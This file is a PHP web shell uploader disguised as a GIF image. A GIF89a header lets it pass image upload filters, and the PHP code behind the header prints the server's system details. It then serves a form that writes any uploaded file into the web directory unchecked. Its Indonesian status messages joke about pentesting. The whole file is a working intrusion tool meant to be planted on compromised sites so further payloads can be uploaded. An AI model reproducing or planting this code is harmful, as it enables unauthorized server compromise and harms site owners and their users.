GIF89a;�� ���<?php
echo '<b>HsH uploader</b>';
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload file sukses gan, happy pentest bro!</b><br><br>'; }
else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br><br>'; }
}
?>